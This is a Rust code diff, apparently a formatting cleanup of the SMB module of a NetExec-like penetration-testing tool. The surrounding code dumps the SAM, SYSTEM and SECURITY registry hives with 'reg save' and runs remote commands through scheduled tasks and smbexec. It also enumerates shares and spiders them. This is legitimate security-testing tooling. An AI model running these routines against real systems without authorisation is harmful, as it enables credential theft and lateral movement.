@@ -9,9 +9,9 @@ use anyhow::{anyhow, Result};
 use async_trait::async_trait;
 use nxc_auth::{kerberos::KerberosClient, AuthResult, Credentials};
 use rand;
+use std::time::Duration;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::net::TcpStream;
-use std::time::Duration;
 use tracing::debug;
 
 // ─── SMB Constants ──────────────────────────────────────────────
@@ -140,11 +140,7 @@ impl std::fmt::Display for ShareInfo {
             (false, true) => "WRITE",
             (false, false) => "NO ACCESS",
         };
-        write!(
-            f,
-            "{:<15} {:<10} {:<15} ({})",
-            self.name, self.share_type, self.remark, access
-        )
+        write!(f, "{:<15} {:<10} {:<15} ({})", self.name, self.share_type, self.remark, access)
     }
 }
 
@@ -168,9 +164,7 @@ pub struct SmbProtocol {
 
 impl SmbProtocol {
     pub fn new() -> Self {
-        Self {
-            timeout: Duration::from_secs(10),
-        }
+        Self { timeout: Duration::from_secs(10) }
     }
 
     pub fn with_timeout(timeout: Duration) -> Self {
@@ -190,22 +184,11 @@ impl SmbProtocol {
         debug!("SMB: Enumerating shares on {} via SRVSVC", session.target);
         use crate::rpc::{srvsvc, DcerpcBind, DcerpcRequest, UUID_SRVSVC};
         let bind = DcerpcBind::new(UUID_SRVSVC, 3, 0);
-        if self
-            .call_rpc(session, "srvsvc", PacketType::Bind, 1, bind.to_bytes())
-            .await
-            .is_ok()
-        {
+        if self.call_rpc(session, "srvsvc", PacketType::Bind, 1, bind.to_bytes()).await.is_ok() {
             let enum_req = self.build_srvsvc_net_share_enum_all(&session.target);
             let rpc_req = DcerpcRequest::new(srvsvc::NET_SHARE_ENUM_ALL, enum_req);
-            if let Ok(enum_resp) = self
-                .call_rpc(
-                    session,
-                    "srvsvc",
-                    PacketType::Request,
-                    2,
-                    rpc_req.to_bytes(),
-                )
-                .await
+            if let Ok(enum_resp) =
+                self.call_rpc(session, "srvsvc", PacketType::Request, 2, rpc_req.to_bytes()).await
             {
                 if let Ok(srv_shares) = self.parse_srvsvc_shares(&enum_resp) {
                     if !srv_shares.is_empty() {
@@ -238,12 +221,8 @@ impl SmbProtocol {
     ) -> Result<Vec<u8>> {
         debug!("SMB: Downloading file '{}' from share '{}'", path, share);
         let tree_id = self.tree_connect(session, share).await?;
-        let fid = self
-            .create_file(session, tree_id, path, 0x00000001, 0x00120089)
-            .await?;
-        let data = self
-            .read_file(session, tree_id, &fid, 0, 1024 * 1024)
-            .await?;
+        let fid = self.create_file(session, tree_id, path, 0x00000001, 0x00120089).await?;
+        let data = self.read_file(session, tree_id, &fid, 0, 1024 * 1024).await?;
         let _ = self.close_file(session, tree_id, &fid).await;
         Ok(data)
     }
@@ -257,9 +236,7 @@ impl SmbProtocol {
     ) -> Result<()> {
         debug!("SMB: Uploading file '{}' to share '{}'", path, share);
         let tree_id = self.tree_connect(session, share).await?;
-        let fid = self
-            .create_file(session, tree_id, path, 0x00000002, 0x0012019f)
-            .await?;
+        let fid = self.create_file(session, tree_id, path, 0x00000002, 0x0012019f).await?;
         self.write_file(session, tree_id, &fid, 0, data).await?;
         let _ = self.close_file(session, tree_id, &fid).await;
         Ok(())
@@ -268,9 +245,7 @@ impl SmbProtocol {
     pub async fn delete_file(&self, session: &SmbSession, share: &str, path: &str) -> Result<()> {
         debug!("SMB: Deleting file '{}' from share '{}'", path, share);
         let tree_id = self.tree_connect(session, share).await?;
-        let fid = self
-            .create_file(session, tree_id, path, 0x00000001, 0x00110000)
-            .await?; // DELETE access
+        let fid = self.create_file(session, tree_id, path, 0x00000001, 0x00110000).await?; // DELETE access
         let _ = self.close_file(session, tree_id, &fid).await;
         Ok(())
     }
@@ -283,9 +258,7 @@ impl SmbProtocol {
     ) -> Result<Vec<String>> {
         debug!("SMB: Listing directory '{}' on share '{}'", dir_path, share);
         let tree_id = self.tree_connect(session, share).await?;
-        let fid = self
-            .create_file(session, tree_id, dir_path, 0x00000001, 0x00100081)
-            .await?;
+        let fid = self.create_file(session, tree_id, dir_path, 0x00000001, 0x00100081).await?;
         let packet = {
             let mut p = self.build_smb2_query_directory_request(fid);
             p[36..40].copy_from_slice(&tree_id.to_le_bytes());
@@ -295,9 +268,7 @@ impl SmbProtocol {
 
         let resp = {
             let mut lock = session.stream.lock().await;
-            let stream = lock
-                .as_mut()
-                .ok_or_else(|| anyhow::anyhow!("No active stream"))?;
+            let stream = lock.as_mut().ok_or_else(|| anyhow::anyhow!("No active stream"))?;
             Self::send_smb2_packet(stream, &packet, session.timeout).await?;
             Self::recv_smb2_packet(stream, session.timeout).await?
         };
@@ -305,7 +276,7 @@ impl SmbProtocol {
         let _ = self.close_file(session, tree_id, &fid).await;
         let status = u32::from_le_bytes(resp[8..12].try_into()?);
         if status != 0 {
-            return Err(anyhow::anyhow!("Query directory failed: 0x{:08x}", status));
+            return Err(anyhow::anyhow!("Query directory failed: 0x{status:08x}"));
         }
         self.parse_query_directory_response(&resp)
     }
@@ -316,14 +287,9 @@ impl SmbProtocol {
         share: &str,
         dir_path: &str,
     ) -> Result<Vec<FileInfo>> {
-        debug!(
-            "SMB: Listing detailed directory '{}' on share '{}'",
-            dir_path, share
-        );
+        debug!("SMB: Listing detailed directory '{}' on share '{}'", dir_path, share);
         let tree_id = self.tree_connect(session, share).await?;
-        let fid = self
-            .create_file(session, tree_id, dir_path, 0x00000001, 0x00100081)
-            .await?;
+        let fid = self.create_file(session, tree_id, dir_path, 0x00000001, 0x00100081).await?;
         let packet = {
             let mut p = self.build_smb2_query_directory_request(fid);
             p[36..40].copy_from_slice(&tree_id.to_le_bytes());
@@ -333,9 +299,7 @@ impl SmbProtocol {
 
         let resp = {
             let mut lock = session.stream.lock().await;
-            let stream = lock
-                .as_mut()
-                .ok_or_else(|| anyhow::anyhow!("No active stream"))?;
+            let stream = lock.as_mut().ok_or_else(|| anyhow::anyhow!("No active stream"))?;
             Self::send_smb2_packet(stream, &packet, session.timeout).await?;
             Self::recv_smb2_packet(stream, session.timeout).await?
         };
@@ -347,7 +311,7 @@ impl SmbProtocol {
             if status == 0x80000006 {
                 return Ok(Vec::new());
             }
-            return Err(anyhow::anyhow!("Query directory failed: 0x{:08x}", status));
+            return Err(anyhow::anyhow!("Query directory failed: 0x{status:08x}"));
         }
         self.parse_query_directory_detailed_response(&resp)
     }
@@ -363,9 +327,7 @@ impl SmbProtocol {
         data: Vec<u8>,
     ) -> Result<Vec<u8>> {
         let tree_id = self.tree_connect(session, "IPC$").await?;
-        let fid = self
-            .create_file(session, tree_id, pipe, 0x00000001, 0x0012019f)
-            .await?; // Open pipe
+        let fid = self.create_file(session, tree_id, pipe, 0x00000001, 0x0012019f).await?; // Open pipe
         let header = DcerpcHeader::new(ptype, call_id, (data.len() + 16) as u16);
         let mut pkt = header.to_bytes();
         pkt.extend_from_slice(&data);
@@ -389,16 +351,14 @@ impl SmbProtocol {
 
         let resp = {
             let mut lock = session.stream.lock().await;
-            let stream = lock
-                .as_mut()
-                .ok_or_else(|| anyhow::anyhow!("No active stream"))?;
+            let stream = lock.as_mut().ok_or_else(|| anyhow::anyhow!("No active stream"))?;
             Self::send_smb2_packet(stream, &packet, session.timeout).await?;
             Self::recv_smb2_packet(stream, session.timeout).await?
         };
 
         let status = u32::from_le_bytes(resp[8..12].try_into()?);
         if status != 0 {
-            return Err(anyhow::anyhow!("CREATE failed: 0x{:08x}", status));
+            return Err(anyhow::anyhow!("CREATE failed: 0x{status:08x}"));
         }
         let mut file_id = [0u8; 16];
         file_id.copy_from_slice(&resp[128..144]);
@@ -419,16 +379,14 @@ impl SmbProtocol {
 
         let resp = {
             let mut lock = session.stream.lock().await;
-            let stream = lock
-                .as_mut()
-                .ok_or_else(|| anyhow::anyhow!("No active stream"))?;
+            let stream = lock.as_mut().ok_or_else(|| anyhow::anyhow!("No active stream"))?;
             Self::send_smb2_packet(stream, &packet, session.timeout).await?;
             Self::recv_smb2_packet(stream, session.timeout).await?
         };
 
         let status = u32::from_le_bytes(resp[8..12].try_into()?);
         if status != 0 {
-            return Err(anyhow::anyhow!("READ failed: 0x{:08x}", status));
+            return Err(anyhow::anyhow!("READ failed: 0x{status:08x}"));
         }
         let data_off = u16::from_le_bytes(resp[64..66].try_into()?) as usize;
         let data_len = u32::from_le_bytes(resp[68..72].try_into()?) as usize;
@@ -449,16 +407,14 @@ impl SmbProtocol {
 
         let resp = {
             let mut lock = session.stream.lock().await;
-            let stream = lock
-                .as_mut()
-                .ok_or_else(|| anyhow::anyhow!("No active stream"))?;
+            let stream = lock.as_mut().ok_or_else(|| anyhow::anyhow!("No active stream"))?;
             Self::send_smb2_packet(stream, &packet, session.timeout).await?;
             Self::recv_smb2_packet(stream, session.timeout).await?
         };
 
         let status = u32::from_le_bytes(resp[8..12].try_into()?);
         if status != 0 {
-            return Err(anyhow::anyhow!("WRITE failed: 0x{:08x}", status));
+            return Err(anyhow::anyhow!("WRITE failed: 0x{status:08x}"));
         }
         Ok(u32::from_le_bytes(resp[72..76].try_into()?))
     }
@@ -475,16 +431,14 @@ impl SmbProtocol {
 
         let resp = {
             let mut lock = session.stream.lock().await;
-            let stream = lock
-                .as_mut()
-                .ok_or_else(|| anyhow::anyhow!("No active stream"))?;
+            let stream = lock.as_mut().ok_or_else(|| anyhow::anyhow!("No active stream"))?;
             Self::send_smb2_packet(stream, &packet, session.timeout).await?;
             Self::recv_smb2_packet(stream, session.timeout).await?
         };
 
         let status = u32::from_le_bytes(resp[8..12].try_into()?);
         if status != 0 {
-            return Err(anyhow::anyhow!("CLOSE failed: 0x{:08x}", status));
+            return Err(anyhow::anyhow!("CLOSE failed: 0x{status:08x}"));
         }
         Ok(())
     }
@@ -500,16 +454,14 @@ impl SmbProtocol {
 
         let resp = {
             let mut lock = session.stream.lock().await;
-            let stream = lock
-                .as_mut()
-                .ok_or_else(|| anyhow::anyhow!("No active stream"))?;
+            let stream = lock.as_mut().ok_or_else(|| anyhow::anyhow!("No active stream"))?;
             Self::send_smb2_packet(stream, &packet, session.timeout).await?;
             Self::recv_smb2_packet(stream, session.timeout).await?
         };
 
         let status = u32::from_le_bytes(resp[8..12].try_into()?);
         if status != 0 {
-            return Err(anyhow::anyhow!("TreeConnect failed: 0x{:08x}", status));
+            return Err(anyhow::anyhow!("TreeConnect failed: 0x{status:08x}"));
         }
         Ok(u32::from_le_bytes(resp[36..40].try_into()?))
     }
@@ -616,9 +568,7 @@ impl SmbProtocol {
         pkt.extend_from_slice(&2u16.to_le_bytes()); // NameLength
         pkt.extend_from_slice(&u32::MAX.to_le_bytes()); // OutputBufferLength
         pkt.extend_from_slice(
-            &"*".encode_utf16()
-                .flat_map(|u| u.to_le_bytes())
-                .collect::<Vec<u8>>(),
+            &"*".encode_utf16().flat_map(|u| u.to_le_bytes()).collect::<Vec<u8>>(),
         );
         pkt
     }
@@ -634,7 +584,7 @@ impl SmbProtocol {
                 0x0210 => "SMB 2.1".into(),
                 0x0300 => "SMB 3.0".into(),
                 0x0311 => "SMB 3.1.1".into(),
-                _ => format!("SMB 0x{:04x}", dialect),
+                _ => format!("SMB 0x{dialect:04x}"),
             };
         }
         Ok(info)
@@ -707,14 +657,7 @@ impl SmbProtocol {
             );
 
             if name != "." && name != ".." {
-                entries.push(FileInfo {
-                    name,
-                    is_dir,
-                    size: eof_size,
-                    ctime,
-                    mtime,
-                    atime,
-                });
+                entries.push(FileInfo { name, is_dir, size: eof_size, ctime, mtime, atime });
             }
             if next_off == 0 {
                 break;
@@ -726,10 +669,8 @@ impl SmbProtocol {
 
     fn build_srvsvc_net_share_enum_all(&self, target: &str) -> Vec<u8> {
         let mut pkt = Vec::new();
-        let target_u16: Vec<u16> = format!("\\\\{}", target)
-            .encode_utf16()
-            .chain(std::iter::once(0))
-            .collect();
+        let target_u16: Vec<u16> =
+            format!("\\\\{target}").encode_utf16().chain(std::iter::once(0)).collect();
         pkt.extend_from_slice(&(target_u16.len() as u32).to_le_bytes());
         pkt.extend_from_slice(&0u32.to_le_bytes());
         pkt.extend_from_slice(&(target_u16.len() as u32).to_le_bytes());
@@ -764,7 +705,11 @@ impl SmbProtocol {
         Ok(shares)
     }
 
-    async fn send_smb2_packet(stream: &mut TcpStream, data: &[u8], timeout: Duration) -> Result<()> {
+    async fn send_smb2_packet(
+        stream: &mut TcpStream,
+        data: &[u8],
+        timeout: Duration,
+    ) -> Result<()> {
         let mut packet = vec![NETBIOS_SESSION_MSG];
         let len = data.len() as u32;
         packet.push(((len >> 16) & 0xff) as u8);
@@ -775,7 +720,9 @@ impl SmbProtocol {
             stream.write_all(&packet).await?;
             stream.flush().await?;
             Ok::<(), anyhow::Error>(())
-        }).await.map_err(|_| anyhow!("SMB send timeout"))??;
+        })
+        .await
+        .map_err(|_| anyhow!("SMB send timeout"))??;
         Ok(())
     }
 
@@ -783,11 +730,14 @@ impl SmbProtocol {
         tokio::time::timeout(timeout, async {
             let mut header = [0u8; 4];
             stream.read_exact(&mut header).await?;
-            let len = ((header[1] as usize) << 16) | ((header[2] as usize) << 8) | (header[3] as usize);
+            let len =
+                ((header[1] as usize) << 16) | ((header[2] as usize) << 8) | (header[3] as usize);
             let mut resp = vec![0u8; len];
             stream.read_exact(&mut resp).await?;
             Ok::<Vec<u8>, anyhow::Error>(resp)
-        }).await.map_err(|_| anyhow!("SMB recv timeout"))?
+        })
+        .await
+        .map_err(|_| anyhow!("SMB recv timeout"))?
     }
 
     async fn authenticate_kerberos(
@@ -805,9 +755,7 @@ impl SmbProtocol {
                 creds.aes_256_key.as_deref(),
             )
             .await?;
-        let tgs = krb_client
-            .request_tgs(&tgt, &format!("cifs/{}", smb_sess.target))
-            .await?;
+        let tgs = krb_client.request_tgs(&tgt, &format!("cifs/{}", smb_sess.target)).await?;
         let ap_req = krb_client.build_ap_req(&tgs)?;
 
         let mut ap_req_pkt = self.build_session_setup_base();
@@ -844,9 +792,9 @@ impl SmbProtocol {
         }
         let mut r = String::new();
         for h in ["SAM", "SYSTEM", "SECURITY"] {
-            let cmd = format!("reg save HKLM\\{} C:\\windows\\temp\\{}.save /y", h, h);
+            let cmd = format!("reg save HKLM\\{h} C:\\windows\\temp\\{h}.save /y");
             if self.execute(session, &cmd).await.is_ok() {
-                r.push_str(&format!("[+] Saved {}\n", h));
+                r.push_str(&format!("[+] Saved {h}\n"));
             }
         }
         Ok(r)
@@ -875,11 +823,7 @@ impl SmbProtocol {
         let mut r = Vec::new();
         if let Ok(entries) = self.list_directory(session, share, path).await {
             for e in entries {
-                let p = if path.is_empty() {
-                    e
-                } else {
-                    format!("{}\\{}", path, e)
-                };
+                let p = if path.is_empty() { e } else { format!("{path}\\{e}") };
                 r.push(p.clone());
                 r.extend(Box::pin(self.spider_directory(session, share, &p, depth - 1)).await?);
             }
@@ -998,10 +942,7 @@ impl NxcProtocol for SmbProtocol {
         };
 
         if status != 0 && status != 0x00000103 {
-            return Ok(AuthResult::failure(
-                "NTLM failed",
-                Some(&format!("{:08x}", status)),
-            ));
+            return Ok(AuthResult::failure("NTLM failed", Some(&format!("{status:08x}"))));
         }
 
         smb_sess.session_id = sid;
@@ -1018,19 +959,11 @@ impl NxcProtocol for SmbProtocol {
             .ok_or_else(|| anyhow!("Not SMB session"))?;
 
         if let Ok(out) = self.call_atexec(smb_sess, cmd).await {
-            return Ok(CommandOutput {
-                stdout: out,
-                stderr: "".into(),
-                exit_code: Some(0),
-            });
+            return Ok(CommandOutput { stdout: out, stderr: "".into(), exit_code: Some(0) });
         }
 
         let out = self.call_smbexec(smb_sess, cmd).await?;
-        Ok(CommandOutput {
-            stdout: out,
-            stderr: "".into(),
-            exit_code: Some(0),
-        })
+        Ok(CommandOutput { stdout: out, stderr: "".into(), exit_code: Some(0) })
     }
 }
 
@@ -1041,19 +974,16 @@ impl SmbProtocol {
         use crate::rpc::{atsvc, DcerpcBind, DcerpcRequest, PacketType, UUID_ATSVC};
 
         let bind = DcerpcBind::new(UUID_ATSVC, 1, 0);
-        let _resp = self
-            .call_rpc(session, "atsvc", PacketType::Bind, 1, bind.to_bytes())
-            .await?;
+        let _resp = self.call_rpc(session, "atsvc", PacketType::Bind, 1, bind.to_bytes()).await?;
 
         // Wrap command in cmd.exe /c and redirect output to a file if we want to read it
         let tmp_file = format!("C:\\windows\\temp\\nxc_{}.tmp", rand::random::<u32>());
-        let full_cmd = format!("cmd.exe /c {} > {} 2>&1", command, tmp_file);
+        let full_cmd = format!("cmd.exe /c {command} > {tmp_file} 2>&1");
 
         let job_req = atsvc::build_netr_job_add(&full_cmd);
         let rpc_req = DcerpcRequest::new(atsvc::NETR_JOB_ADD, job_req);
 
-        self.call_rpc(session, "atsvc", PacketType::Request, 2, rpc_req.to_bytes())
-            .await?;
+        self.call_rpc(session, "atsvc", PacketType::Request, 2, rpc_req.to_bytes()).await?;
 
         // Wait for execution and read file
         tokio::time::sleep(Duration::from_secs(2)).await;
@@ -1063,9 +993,7 @@ impl SmbProtocol {
             .unwrap_or_default();
 
         // Cleanup
-        let _ = self
-            .delete_file(session, "C$", &tmp_file.replace("C:\\", ""))
-            .await;
+        let _ = self.delete_file(session, "C$", &tmp_file.replace("C:\\", "")).await;
 
         Ok(String::from_utf8_lossy(&output).to_string())
     }
@@ -1086,22 +1014,22 @@ mod tests {
         let mut header_obj = Smb2Header::new(0x00);
         header_obj.message_id = 1;
         let header = header_obj.to_bytes();
-        
+
         assert_eq!(header.len(), 64);
         assert_eq!(&header[0..4], b"\xfeSMB");
         assert_eq!(&header[12..14], &[0x00, 0x00]); // OP CODE
-        assert_eq!(&header[24..32], &[1,0,0,0,0,0,0,0]); // Message ID (64-bit now)
+        assert_eq!(&header[24..32], &[1, 0, 0, 0, 0, 0, 0, 0]); // Message ID (64-bit now)
     }
 
     #[test]
     fn test_smb_session_setup_base() {
         let proto = SmbProtocol::new();
         let pkt = proto.build_session_setup_base();
-        
+
         // 64-byte Header + 24-byte Session Setup Base
         assert_eq!(pkt.len(), 64 + 24);
         assert_eq!(&pkt[0..4], b"\xfeSMB");
         // Opcode 0x01 is Session Setup
-        assert_eq!(&pkt[12..14], &[0x01, 0x00]); 
+        assert_eq!(&pkt[12..14], &[0x01, 0x00]);
     }
 }
